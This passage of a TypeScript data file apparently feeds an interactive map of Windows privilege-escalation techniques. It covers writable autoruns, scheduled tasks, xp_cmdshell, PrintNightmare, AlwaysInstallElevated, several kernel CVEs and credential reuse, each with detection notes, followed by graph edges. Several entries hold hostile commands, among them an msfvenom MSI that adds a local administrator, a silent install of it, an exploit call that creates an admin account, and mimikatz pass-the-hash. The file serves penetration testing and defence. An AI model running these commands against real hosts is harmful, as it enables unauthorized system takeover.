      { name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
      { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Show the system PATH', code: r`reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path`, lang: 'cmd' },
      { label: 'Check each PATH dir for write access', code: r`accesschk.exe -dqwu "C:\SomePathDir" /accepteula`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.007'),
    references: [{ label: 'MITRE T1574.007 — Path Interception by PATH Env Var', url: 'https://attack.mitre.org/techniques/T1574/007/' }],
    requires: ['A user-writable directory on the system PATH', 'A privileged service/process that DLL-loads by bare name'],
    opsec: 'An unsigned DLL loaded by a signed, privileged binary from a user-writable PATH directory (Sysmon Event ID 7) is a strong signal.',
    difficulty: 'medium',
  },

  // ── Scheduled Tasks & Autoruns ──────────────────────────────────────────────
  {
    id: 'pe-autorun-writable',
    label: 'Writable Autorun',
    phase: 'finding',
    summary: 'Overwrite an autorun binary that runs as an admin.',
    affects: 'All supported Windows versions (configuration weakness).',
    description: r`Programs referenced by Run/RunOnce registry keys or the Startup folder execute when a user logs on. If an autorun entry points to a binary you can overwrite (or its key is writable), replace it; when a higher-privileged user logs in, your payload runs in their context. Enumerate with Autoruns or winPEAS.`,
    tools: [
      { name: 'Autoruns (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns' },
      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
    ],
    commands: [
      { label: 'List Run keys', code: r`reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, lang: 'cmd' },
      { label: 'Check write access to the target binary', code: r`accesschk.exe -wvu "C:\Path\To\autorun.exe" /accepteula`, lang: 'cmd' },
    ],
    mitre: mitre('T1547.001'),
    requires: ['Writable autorun binary or writable Run key', 'A higher-privileged user logs in'],
    opsec: 'Requires waiting for an admin logon. New/changed autorun entries are a classic detection (Autoruns, Sysmon).',
    difficulty: 'medium',
  },
  {
    id: 'pe-scheduled-task-abuse',
    label: 'Scheduled Task Abuse',
    phase: 'finding',
    summary: 'Hijack a task whose binary you can overwrite.',
    affects: 'All supported Windows versions (configuration weakness).',
    description: r`Enumerate scheduled tasks and their actions; if a task runs as SYSTEM (or another privileged user) and invokes a binary/script you can write to, overwrite it with your payload. It executes under the task principal at the next trigger. Tasks running as SYSTEM are the prize.`,
    tools: [
      { name: 'schtasks', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks' },
      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
    ],
    commands: [
      { label: 'Enumerate tasks + run-as user', code: r`schtasks /query /fo LIST /v`, lang: 'cmd' },
      { label: "Check write access to a task's target", code: r`accesschk.exe -quv "C:\Path\To\task.exe" /accepteula`, lang: 'cmd' },
    ],
    mitre: mitre('T1053.005'),
    requires: ['Writable binary/script invoked by a privileged scheduled task', 'Task trigger fires (or you can run it)'],
    opsec: 'Event ID 4698/4702 on task changes; file modification of the task target. Overwriting an existing task binary is quieter than creating a new task.',
    difficulty: 'medium',
  },

  // ── Privileged App & Service Abuse ──────────────────────────────────────────
  {
    id: 'pe-mssql-xpcmdshell',
    label: 'MSSQL xp_cmdshell',
    phase: 'finding',
    summary: 'Run OS commands as the SQL service account.',
    affects: 'Any Windows host with a local MSSQL instance you are sysadmin on (SQL-version dependent, not OS).',
    description: r`With sysadmin access to a local MSSQL instance, enable and call xp_cmdshell to execute OS commands as the SQL Server service account. If that account holds SeImpersonatePrivilege (common for service accounts), chain into a Potato attack for full SYSTEM.`,
    tools: [{ name: 'impacket-mssqlclient', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Enable xp_cmdshell', code: r`EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`, lang: 'cmd' },
      { label: 'Execute as the service account', code: r`EXEC xp_cmdshell 'whoami /priv';`, lang: 'cmd' },
    ],
    mitre: mitre('T1505.001'),
    references: [{ label: 'HackTricks — Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' }],
    requires: ['sysadmin role on the MSSQL instance', 'xp_cmdshell enable-able'],
    opsec: 'sp_configure + xp_cmdshell are heavily monitored; many EDRs flag sqlservr.exe spawning cmd.exe.',
    difficulty: 'medium',
  },
  {
    id: 'pe-vuln-software',
    label: 'Vulnerable Third-Party Software',
    phase: 'finding',
    summary: 'Exploit a known LPE in installed software.',
    affects: 'Depends on the installed software, not the Windows build.',
    description: r`Enumerate installed applications and services and match their versions to public local-privilege-escalation CVEs — vulnerable updaters, agents, VPN clients, and helper services frequently run as SYSTEM and have known exploits. winPEAS flags installed software and writable program directories; an outdated third-party service is often the easiest SYSTEM on the box.`,
    tools: [
      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
      { name: 'Exploit-DB', url: 'https://www.exploit-db.com/' },
    ],
    commands: [
      { label: 'List installed software', code: r`wmic product get name,version`, lang: 'cmd' },
      { label: 'Non-default service binaries', code: r`wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    references: [{ label: 'HackTricks — Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    requires: ['Installed software with a known, exploitable LPE'],
    opsec: 'Exploit reliability varies; a crashing helper service is noticeable.',
    difficulty: 'medium',
  },
  {
    id: 'pe-insecure-gui',
    label: 'Insecure GUI App as Admin',
    phase: 'finding',
    summary: 'Break out of a higher-privileged app into a shell.',
    description: r`Any custom or third-party application installed on the host and running at higher privilege is a candidate — a vendor management console, an elevated helper service with a tray UI, line-of-business / in-house software, a kiosk app, or an installer. Such apps are frequently configured to run as Administrator or SYSTEM and are rarely hardened, so they can be coerced into spawning a child process that inherits their privileges: break out through a File > Open/Save dialog (type a path, or right-click > Open in a new window), embedded Help (hh.exe), or a hyperlink that launches a browser you then escape to cmd. The more bespoke software a machine runs elevated, the more of these break-out primitives exist — enumerate what is installed and how each process runs.`,
    tools: [{ name: 'HackTricks — Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    mitre: mitre('T1548'),
    references: [{ label: 'HackTricks — GUI apps & privilege escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    requires: ['A higher-privileged (admin/SYSTEM) GUI process you can interact with'],
    opsec: 'Spawning cmd from an unexpected parent (a vendor app, an installer, a browser, hh.exe) is a strong process-tree signal.',
    affects: 'Depends on the installed application, not the Windows build.',
    difficulty: 'medium',
  },
  {
    id: 'pe-printnightmare',
    label: 'PrintNightmare (CVE-2021-34527)',
    phase: 'finding',
    summary: 'Spooler loads an attacker DLL as SYSTEM.',
    affects: 'Unpatched Windows / Server, pre-July 2021 (CVE-2021-34527); Print Spooler must be enabled.',
    description: r`The Print Spooler's RpcAddPrinterDriverEx lets an authenticated user register a printer "driver" DLL that spoolsv.exe (running as SYSTEM) then loads. Run locally against the host's own spooler, the LPE variant points it at a DLL on disk and executes it as SYSTEM. Requires the Print Spooler service to be running; fully mitigated by disabling it or patching.`,
    tools: [
      { name: 'SharpPrintNightmare', url: 'https://github.com/cube0x0/CVE-2021-1675' },
      { name: 'mimikatz (misc::printnightmare)', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Local LPE via a driver DLL', code: r`SharpPrintNightmare.exe C:\Temp\addCync.dll`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    references: [{ label: 'MSRC — CVE-2021-34527', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527' }],
    requires: ['Print Spooler service running', 'Unpatched host'],
    opsec: 'Spooler loading a user-supplied driver DLL is heavily detected post-2021. Disabling the spooler kills it entirely.',
    difficulty: 'medium',
  },

  // ── Standalone: installer policy ────────────────────────────────────────────
  {
    id: 'pe-always-install-elevated',
    label: 'AlwaysInstallElevated',
    phase: 'finding',
    summary: 'Install a malicious MSI that runs as SYSTEM.',
    affects: 'All supported Windows versions (only when the AlwaysInstallElevated policy is enabled in both hives).',
    description: r`If the AlwaysInstallElevated policy DWORD is set to 1 in BOTH HKLM and HKCU, any user can install an MSI package that executes with SYSTEM privileges. Generate a malicious MSI and install it quietly. Both keys must be set — one alone is not exploitable.`,
    tools: [
      { name: 'msfvenom (Metasploit)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Check both hives (both must be 0x1)', code: r`reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`, lang: 'cmd' },
      { label: 'Build a SYSTEM payload MSI', code: r`msfvenom -p windows/x64/exec cmd='net localgroup administrators attacker /add' -f msi -o evil.msi`, lang: 'bash' },
      { label: 'Install silently', code: r`msiexec /quiet /qn /i C:\Temp\evil.msi`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'PentestLab — Always Install Elevated', url: 'https://pentestlab.blog/2017/02/28/always-install-elevated/' }],
    requires: ['AlwaysInstallElevated = 0x1 in HKLM AND HKCU'],
    opsec: 'msiexec installing an unsigned MSI from a temp path is suspicious; the new local admin / process tree is detectable.',
    difficulty: 'easy',
  },

  // ── Known Exploits (CVE) ────────────────────────────────────────────────────
  {
    id: 'pe-kernel-enum',
    label: 'Enumerate Missing Patches',
    phase: 'finding',
    summary: 'Map OS build/hotfixes to known kernel LPEs.',
    affects: 'Triage step — applicability depends on the CVE it surfaces.',
    description: r`Collect systeminfo (OS version + installed KBs) and feed it to WES-NG, or run Watson on-host, to list kernel/privilege-escalation CVEs the system is missing patches for. This is the triage step before grabbing a specific exploit binary; prefer it on older/unpatched hosts where service/token misconfigs are absent.`,
    tools: [
      { name: 'WES-NG', url: 'https://github.com/bitsadmin/wesng' },
      { name: 'Watson', url: 'https://github.com/rasta-mouse/Watson' },
    ],
    commands: [
      { label: 'Collect target info', code: r`systeminfo > systeminfo.txt`, lang: 'cmd' },
      { label: 'Analyze offline (attacker host)', code: r`python wes.py systeminfo.txt`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [{ label: 'HackTricks — Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    requires: ['Low-priv shell', 'Ability to read OS version / run systeminfo'],
    opsec: 'WES-NG runs offline on the attacker host (invisible). Watson is a .NET assembly run on-target. The follow-on kernel exploit is what risks instability.',
    difficulty: 'medium',
  },
  {
    id: 'pe-kernel-exploit',
    label: 'Kernel Exploit (generic)',
    phase: 'finding',
    summary: 'Run a public exploit for an unpatched kernel CVE.',
    affects: 'Depends entirely on the specific CVE and exact build.',
    description: r`Once a missing-patch CVE is identified, run the matching public exploit to execute code in the kernel and obtain a SYSTEM context (e.g. older targets vulnerable to MS16-032, CVE-2018-8120). Verify the exact build first — wrong-build kernel exploits frequently bugcheck the host.`,
    tools: [{ name: 'SecWiki windows-kernel-exploits', url: 'https://github.com/SecWiki/windows-kernel-exploits' }],
    commands: [
      { label: 'Example (build-specific binary)', code: r`.\exploit.exe "cmd /c net localgroup administrators attacker /add"`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    requires: ['Confirmed unpatched kernel CVE for the exact OS build'],
    opsec: 'High risk of instability / BSOD on the wrong build. Loud and last-resort; prefer misconfig-based vectors when available.',
    difficulty: 'hard',
  },
  {
    id: 'pe-cve-2023-21768',
    label: 'CVE-2023-21768 (AFD.sys)',
    phase: 'finding',
    summary: 'AFD for WinSock LPE on Win11 22H2 / Server 2022.',
    affects: 'Windows 11 22H2 and Server 2022, unpatched (pre-Jan 2023).',
    versions: ['win11-22h2', 'srv2022'],
    description: r`An elevation-of-privilege flaw in the Ancillary Function Driver for WinSock (afd.sys). The widely-used public PoC abuses an arbitrary write to swap a token, taking an unprivileged process to SYSTEM on Windows 11 22H2 and Server 2022. Fast and reliable on vulnerable builds.`,
    tools: [{ name: 'chompie1337 PoC', url: 'https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768' }],
    mitre: mitre('T1068'),
    references: [
      { label: 'MSRC — CVE-2023-21768', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21768' },
      { label: 'SentinelOne — CVE-2023-21768', url: 'https://www.sentinelone.com/blog/cve-2023-21768/' },
    ],
    requires: ['Unpatched Windows 11 22H2 / Server 2022 build'],
    opsec: 'Driver exploitation can be caught by HVCI/EDR; the wrong build risks a bugcheck.',
    difficulty: 'medium',
  },
  {
    id: 'pe-cve-2021-1732',
    label: 'CVE-2021-1732 (Win32k)',
    phase: 'finding',
    summary: 'Win32k type confusion → SYSTEM (in-the-wild).',
    affects: 'Windows 10 1803–20H2 and Server 2019, unpatched (pre-Feb 2021). Per NVD CPE data, Server 2016 is not affected.',
    versions: [...range('win10-1803', 'win10-20h2'), 'srv2019'],
    description: r`A Win32k elevation-of-privilege via a user-mode callback type confusion (NtUserConsoleControl / xxxClientAllocWindowClassExtraBytes) that yields kernel read/write and a token swap to SYSTEM. Originally exploited in the wild by the Bitter APT; reliable public PoCs exist for the affected Windows 10 builds.`,
    tools: [{ name: 'KaLendsi PoC', url: 'https://github.com/KaLendsi/CVE-2021-1732-Exploit' }],
    mitre: mitre('T1068'),
    references: [{ label: 'MSRC — CVE-2021-1732', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732' }],
    requires: ['Unpatched affected Windows 10 / Server build'],
    opsec: 'Kernel token manipulation is EDR-visible; the wrong build risks instability.',
    difficulty: 'medium',
  },
  {
    id: 'pe-cve-2020-0787',
    label: 'CVE-2020-0787 (BITS)',
    phase: 'finding',
    summary: 'BITS arbitrary file move → SYSTEM, no SeImpersonate.',
    affects: 'Windows 7 – Windows 10 1909 / Server 2008–2019, unpatched (pre-Mar 2020).',
    versions: [...range('win7', 'win10-1909'), 'srv2008', 'srv2012', 'srv2016', 'srv2019'],
    description: r`A symlink / arbitrary-file-move flaw in the Background Intelligent Transfer Service (BITS) that itm4n's exploit turns into an arbitrary file write as SYSTEM, then code execution. Notable for working from a plain user without SeImpersonatePrivilege, across a wide range of Windows 7–10 builds.`,
    tools: [{ name: 'itm4n CVE-2020-0787 PoC', url: 'https://github.com/itm4n/CVE-2020-0787-BitsArbitraryFileMove' }],
    mitre: mitre('T1068'),
    references: [
      { label: 'MSRC — CVE-2020-0787', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0787' },
      { label: 'itm4n — CVE-2020-0787', url: 'https://itm4n.github.io/cve-2020-0787-windows-bits/' },
    ],
    requires: ['Unpatched Windows 7–10 / Server build', 'BITS service available'],
    opsec: 'Reliable and quiet relative to kernel exploits, but the file-move primitive and new SYSTEM process are detectable.',
    difficulty: 'medium',
  },
  {
    id: 'pe-cve-2019-1388',
    label: 'CVE-2019-1388 (hhupd)',
    phase: 'finding',
    summary: 'UAC certificate dialog → SYSTEM browser → shell.',
    affects: 'Windows 7 through 10 1903 and Server 2008 through 2019, unpatched (pre-Nov 2019). Windows 10 1909 shipped with the fix.',
    versions: [...range('win7', 'win10-1903'), 'srv2008', 'srv2012', 'srv2016', 'srv2019'],
    description: r`The Windows Certificate Dialog in the hhupd.exe UAC prompt failed to drop privileges when following the certificate's "Issued by" hyperlink. Clicking it opens Internet Explorer as SYSTEM; from there a Save-As / file dialog launches cmd.exe as SYSTEM. A famous one-click GUI escalation on unpatched Windows 7–10 / 2008–2019.`,
    tools: [{ name: 'CVE-2019-1388 writeup', url: 'https://github.com/jas502n/CVE-2019-1388' }],
    mitre: mitre('T1548.002'),
    references: [
      { label: 'MSRC — CVE-2019-1388', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1388' },
      { label: 'ZDI — CVE-2019-1388', url: 'https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege' },
    ],
    requires: ['Unpatched build', 'Ability to trigger the hhupd UAC dialog'],
    opsec: 'cmd.exe spawned from iexplore/hh.exe as SYSTEM is an obvious process-tree anomaly.',
    difficulty: 'easy',
  },

  // ── Shared mechanisms (where findings converge on SYSTEM) ───────────────────
  {
    id: 'pe-prim-service-exec',
    label: 'Service Executes Your Code',
    phase: 'system',
    hub: true,
    summary: 'A SYSTEM service launches your payload on (re)start.',
    description: r`The convergence point of the service branch: whether you rewrote a binPath, replaced the on-disk EXE, hijacked a DLL it loads, edited the service's registry key, reconfigured it as a Server Operator, or pointed a service plugin at your DLL (DnsAdmins) — the outcome is identical. When the Service Control Manager next starts the service, it runs your code as its account, almost always LocalSystem.`,
    commands: [
      { label: 'Trigger the (re)start', code: r`sc stop <service> & sc start <service>`, lang: 'cmd' },
    ],
    requires: ['Control over what a privileged service executes', 'Ability to (re)start the service or wait for a reboot'],
    opsec: 'Service install/change events (7045/7040) plus an unusual child process under services.exe are high-fidelity signals. Restore the original config afterward.',
    difficulty: 'easy',
  },
  {
    id: 'pe-prim-trigger',
    label: 'Auto-Run Executes Your Code',
    phase: 'system',
    hub: true,
    summary: 'Code a higher-privileged context runs automatically.',
    description: r`Several misconfigs share one shape: a binary or script that a higher-privileged context executes — on a schedule, at logon, or via an accessibility hook (utilman/sethc) — is writable by you, directly or after taking ownership. Overwrite it and wait for, or invoke, the trigger; your payload then runs as that principal.`,
    mitre: mitre('T1547.001'),
    requires: ['A writable binary/script invoked automatically by a privileged context', 'The trigger fires — logon, schedule, lock screen, or you invoke it'],
    opsec: 'New/modified autorun, scheduled-task, or accessibility binaries are classic IOCs (Autoruns, Sysmon, Event ID 4698/4702). Overwriting an existing target is quieter than creating one; restore it afterward.',
    difficulty: 'medium',
  },
  {
    id: 'pe-prim-kernel-exec',
    label: 'Kernel-Mode Code Execution',
    phase: 'system',
    hub: true,
    summary: 'Ring-0 execution collapses straight to SYSTEM.',
    description: r`Where the kernel branch converges: a public kernel-CVE exploit, or a bring-your-own-vulnerable-driver load (via SeLoadDriverPrivilege / Print Operators), gives you code execution in ring 0. From the kernel you can patch your token, steal the SYSTEM token, or spawn a SYSTEM process directly. The most powerful but least stable route — a wrong-build exploit or a blocked driver bugchecks the host.`,
    mitre: mitre('T1068'),
    requires: ['A working kernel exploit, or a loadable vulnerable driver, for the exact OS build'],
    opsec: 'Driver loads and ring-0 token manipulation are top-tier EDR / HVCI detections, and instability risks a visible crash. Prefer a misconfig vector when one exists.',
    difficulty: 'hard',
  },
  {
    id: 'pe-recovered-creds',
    label: 'Recovered Credentials',
    phase: 'finding',
    hub: true,
    summary: 'A credential you recovered. Reuse it, and if it is a local admin, escalate.',
    affects: 'All supported Windows versions.',
    description: r`Hunting the host (event logs, SAM/LSA secrets, DPAPI, autologon, config files, PowerShell history, browser and password-manager stores, the Credential Manager vault) yields a CREDENTIAL, not SYSTEM. What it gets you depends on whose it is. A local administrator's password or hash can be reused (runas, or pass-the-hash as RID 500 where LocalAccountTokenFilterPolicy allows) to act as a local admin on this host, then take an Admin to SYSTEM path. A domain or service account is a lateral lead into the Active Directory map. A peer user's is only useful sideways. Check what the account actually is before assuming it helps.`,
    tools: [
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Run as the recovered local user (cleartext)', code: r`runas /user:Administrator cmd.exe`, lang: 'cmd' },
      { label: 'Pass-the-hash to a local admin shell (token injection, no network)', code: r`sekurlsa::pth /user:Administrator /domain:. /ntlm:<nthash> /run:cmd.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1078'),
    references: [{ label: 'HackTricks, Windows local privilege escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    requires: ['A credential recovered from the host'],
    opsec: 'Reusing a recovered local credential (a 4624 type 2/3 logon, runas, or local pass-the-hash) is quieter than exploitation but still logged; a mismatched account or source is the tell.',
    difficulty: 'medium',
  },
];

export const peTechniqueEdges: AttackEdge[] = [
  // Triage gate forks into three account contexts.
  { source: 'pe-start', target: 'pe-cat-priv' },
  { source: 'pe-start', target: 'pe-cat-admin' },
  { source: 'pe-start', target: 'pe-cat-enum' },

  // Lane sub-folders.
  { source: 'pe-cat-priv', target: 'pe-cat-tokens' },
  { source: 'pe-cat-priv', target: 'pe-cat-groups' },
  { source: 'pe-cat-admin', target: 'pe-cat-uac', label: 'if medium integrity (UAC-filtered)' },
  { source: 'pe-cat-admin', target: 'pe-cat-admin2sys', label: 'if already high integrity' },
  { source: 'pe-cat-enum', target: 'pe-cat-creds' },
  { source: 'pe-cat-enum', target: 'pe-cat-services' },
  { source: 'pe-cat-enum', target: 'pe-cat-dll' },
  { source: 'pe-cat-enum', target: 'pe-cat-tasks' },
  { source: 'pe-cat-enum', target: 'pe-cat-apps' },
  { source: 'pe-cat-enum', target: 'pe-cat-cve' },

  // Folder -> technique.
  { source: 'pe-cat-tokens', target: 'pe-localservice-fullpowers' },
  { source: 'pe-cat-tokens', target: 'pe-seimpersonate-potato' },
  { source: 'pe-cat-tokens', target: 'pe-sebackup-restore' },
  { source: 'pe-cat-tokens', target: 'pe-sedebug-lsass' },
  { source: 'pe-cat-tokens', target: 'pe-setakeownership' },
  { source: 'pe-cat-tokens', target: 'pe-seloaddriver' },
  { source: 'pe-cat-tokens', target: 'pe-semanagevolume' },
  { source: 'pe-cat-tokens', target: 'pe-setrustedcredman' },
  { source: 'pe-cat-tokens', target: 'pe-secreatetoken' },
  { source: 'pe-cat-tokens', target: 'pe-setcb' },
  { source: 'pe-cat-tokens', target: 'pe-serelabel' },
  { source: 'pe-cat-groups', target: 'pe-backup-operators' },
  { source: 'pe-cat-groups', target: 'pe-server-operators' },
  { source: 'pe-cat-groups', target: 'pe-dnsadmins' },
  { source: 'pe-cat-groups', target: 'pe-hyperv-admins' },
  { source: 'pe-cat-groups', target: 'pe-print-operators' },
  { source: 'pe-cat-groups', target: 'pe-event-log-readers' },
  { source: 'pe-cat-groups', target: 'pe-account-operators' },
  { source: 'pe-cat-groups', target: 'pe-admins-filtered' },
  { source: 'pe-cat-uac', target: 'pe-uac-fodhelper' },
  { source: 'pe-cat-uac', target: 'pe-uac-eventvwr' },
  { source: 'pe-cat-uac', target: 'pe-uac-sdclt' },
  { source: 'pe-cat-uac', target: 'pe-uac-computerdefaults' },
  { source: 'pe-cat-uac', target: 'pe-uac-cmstp' },
  { source: 'pe-cat-uac', target: 'pe-uac-silentcleanup' },
  { source: 'pe-cat-admin2sys', target: 'pe-admin-service-system' },
  { source: 'pe-cat-admin2sys', target: 'pe-admin-schtask-system' },
  { source: 'pe-cat-admin2sys', target: 'pe-admin-token' },
  { source: 'pe-cat-creds', target: 'pe-sam-system-dump' },
  { source: 'pe-cat-creds', target: 'pe-dpapi-creds' },
  { source: 'pe-cat-creds', target: 'pe-stored-creds' },
  { source: 'pe-cat-creds', target: 'pe-winlogon-autologon' },
  { source: 'pe-cat-creds', target: 'pe-hivenightmare' },
  { source: 'pe-cat-creds', target: 'pe-powershell-history' },
  { source: 'pe-cat-creds', target: 'pe-config-password-hunt' },
  { source: 'pe-cat-creds', target: 'pe-password-managers' },
  { source: 'pe-cat-services', target: 'pe-unquoted-service-path' },
  { source: 'pe-cat-services', target: 'pe-weak-service-perms' },
  { source: 'pe-cat-services', target: 'pe-insecure-service-binary' },
  { source: 'pe-cat-services', target: 'pe-weak-registry-service' },
  { source: 'pe-cat-dll', target: 'pe-service-dll-hijack' },
  { source: 'pe-cat-dll', target: 'pe-path-dll-hijack' },
  { source: 'pe-cat-tasks', target: 'pe-autorun-writable' },
  { source: 'pe-cat-tasks', target: 'pe-scheduled-task-abuse' },
  { source: 'pe-cat-apps', target: 'pe-mssql-xpcmdshell' },
  { source: 'pe-cat-apps', target: 'pe-vuln-software' },
  { source: 'pe-cat-apps', target: 'pe-insecure-gui' },
  { source: 'pe-cat-apps', target: 'pe-printnightmare' },
  { source: 'pe-cat-apps', target: 'pe-always-install-elevated' },
  { source: 'pe-cat-cve', target: 'pe-kernel-enum' },
  { source: 'pe-cat-cve', target: 'pe-cve-2023-21768' },
  { source: 'pe-cat-cve', target: 'pe-cve-2021-1732' },
  { source: 'pe-cat-cve', target: 'pe-cve-2020-0787' },
  { source: 'pe-cat-cve', target: 'pe-cve-2019-1388' },

  // Transitions carry a shared `rel` (data/relationships.ts) that drives the
  // edge-panel explanation; no on-graph captions.

  // Privileged Users -> outcome.
  { source: 'pe-localservice-fullpowers', target: 'pe-seimpersonate-potato', rel: 'enables', label: 'restores SeImpersonate' },
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-juicypotato' },
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-printspoofer' },
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-roguepotato' },
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-godpotato' },
  { source: 'pe-pot-juicypotato', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-pot-printspoofer', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-pot-roguepotato', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-pot-godpotato', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-sebackup-restore', target: 'pe-sam-system-dump', rel: 'enables' },
  { source: 'pe-sedebug-lsass', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-setakeownership', target: 'pe-prim-trigger', rel: 'enables' },
  { source: 'pe-seloaddriver', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-semanagevolume', target: 'pe-prim-trigger', rel: 'enables' },
  { source: 'pe-setrustedcredman', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'Credential Manager store' },
  { source: 'pe-secreatetoken', target: 'nt-system', label: 'admin token, then SYSTEM' },
  { source: 'pe-setcb', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-serelabel', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-backup-operators', target: 'pe-sam-system-dump', rel: 'enables' },
  { source: 'pe-server-operators', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-dnsadmins', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-hyperv-admins', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-print-operators', target: 'pe-seloaddriver', rel: 'enables', label: 'load a driver' },
  { source: 'pe-event-log-readers', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'credentials from logs' },
  { source: 'pe-account-operators', target: 'nt-system', label: 'new admin, then SYSTEM' },
  { source: 'pe-admins-filtered', target: 'pe-cat-uac', rel: 'enables', label: 'unfilter the token' },

  // Admin Users -> outcome.
  { source: 'pe-uac-fodhelper', target: 'nt-system', label: 'high-integrity, then SYSTEM' },
  { source: 'pe-uac-eventvwr', target: 'nt-system', label: 'high-integrity, then SYSTEM' },
  { source: 'pe-uac-sdclt', target: 'nt-system', label: 'high-integrity, then SYSTEM' },
  { source: 'pe-uac-computerdefaults', target: 'nt-system', label: 'high-integrity, then SYSTEM' },
  { source: 'pe-uac-cmstp', target: 'nt-system', label: 'high-integrity, then SYSTEM' },
  { source: 'pe-uac-silentcleanup', target: 'nt-system', label: 'high-integrity, then SYSTEM' },
  { source: 'pe-admin-service-system', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-admin-schtask-system', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-admin-token', target: 'nt-system', rel: 'host-exec' },

  // Stored Credentials -> reuse -> SYSTEM.
  { source: 'pe-sam-system-dump', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'local NTLM hashes' },
  { source: 'pe-dpapi-creds', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'DPAPI secrets' },
  { source: 'pe-stored-creds', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'saved credential' },
  { source: 'pe-winlogon-autologon', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'autologon password' },
  { source: 'pe-hivenightmare', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'local-admin hash' },
  { source: 'pe-powershell-history', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'secrets from history' },
  { source: 'pe-config-password-hunt', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'credentials in files' },
  { source: 'pe-password-managers', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'vault & browser logins' },
  { source: 'pe-recovered-creds', target: 'nt-system', rel: 'cred-reuse', label: 'if a local admin' },

  // Service / DLL / PATH -> "service executes your code" mechanism.
  { source: 'pe-unquoted-service-path', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-weak-service-perms', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-insecure-service-binary', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-weak-registry-service', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-service-dll-hijack', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-path-dll-hijack', target: 'pe-prim-service-exec', rel: 'enables' },

  // Tasks / autoruns -> "auto-run executes your code" mechanism.
  { source: 'pe-autorun-writable', target: 'pe-prim-trigger', rel: 'enables' },
  { source: 'pe-scheduled-task-abuse', target: 'pe-prim-trigger', rel: 'enables' },

  // App & service abuse -> outcome.
